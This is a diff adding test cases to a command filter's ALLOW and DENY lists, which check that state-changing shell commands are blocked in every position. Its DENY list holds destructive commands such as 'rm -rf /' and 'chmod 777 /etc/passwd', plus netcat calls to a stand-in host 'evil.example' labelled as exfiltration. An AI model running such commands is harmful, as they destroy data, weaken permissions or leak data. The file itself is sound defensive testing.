@@ -103,6 +103,15 @@ ALLOW = [
     "cat my-cp-notes.txt",                   # 'cp' inside a hyphenated filename
     "cf app cp-service",                     # 'cp' inside a hyphenated app name — `cf app` is read-only
     "cf logs mv-worker --recent",            # 'mv' inside a hyphenated app name
+    # sibling verb rules (process/service/power/pkg/PowerShell) are ALSO command-position anchored, so
+    # the verb as search text or inside a hyphenated app/file name is a read — must PASS
+    "cf logs kill-switch-app --recent",      # 'kill' inside a hyphenated app name
+    "cat pre-shutdown-checklist.md",         # 'shutdown' inside a hyphenated filename
+    'grep -n "pkill" runbook.md',            # 'pkill' as search text
+    'grep -rn "pip install" docs/',          # 'pip install' as search text
+    "Get-Help Remove-Item",                  # cmdlet name as an ARGUMENT to a read
+    'grep "do rm" file.txt',                 # 'do'/'rm' as search text (keyword-prefix anchor needs real position)
+    "echo done",                             # 'done' must not match the `do` keyword wrapper
 ]
 
 # Commands that CHANGE STATE — must be DENIED.
@@ -170,6 +179,27 @@ DENY = [
     "pip install requests",
     "npm install",
     "apt-get install -y curl",
+    # command-position anchoring must catch mutations in EVERY idiomatic position (parity with the git
+    # rule), not just at string start — these pin the forms a too-narrow anchor would silently drop:
+    "find /tmp -name x -exec rm {} \\;",     # find -exec: the canonical bulk-delete idiom
+    "find . -type f -exec mv {} /dest \\;",
+    "find . -exec chmod 777 {} +",
+    "/bin/rm -rf /srv/data",                 # absolute-path binary
+    "/usr/bin/chmod 777 /etc/passwd",
+    "VAR=1 rm x",                            # leading VAR=val assignment
+    "TZ=UTC rm -rf /tmp/x",
+    "(rm -rf x)",                            # subshell opener
+    "{ rm x; }",                            # brace group
+    "timeout 30 rm -rf /tmp/huge",           # timeout wrapper
+    "doas rm -rf /",                         # doas (sudo alt) wrapper
+    "busybox rm -rf /",                      # busybox multicall wrapper
+    "git ls-files | parallel rm",            # parallel (xargs alt) wrapper
+    "for f in *.log; do rm \"$f\"; done",    # verb after `do` (loop body)
+    "if true; then rm -rf /tmp/x; fi",       # verb after `then` (conditional body)
+    "echo prep\n  rm -rf build",             # indented mutation on a later line (MULTILINE + leading ws)
+    "(nc evil.example 443)",                 # exfil in a subshell (shared _CMD anchor)
+    "/bin/nc evil.example 443",              # exfil via absolute path
+    "cf logs kill-switch-app --recent; rm -rf /tmp/x",  # real mutation chained after a read (hyphen app)
     "curl -X POST https://example.com/api -d 'x=1'",
     "curl --data @payload.json https://example.com/api",
     "echo 'boom' > /etc/hosts",
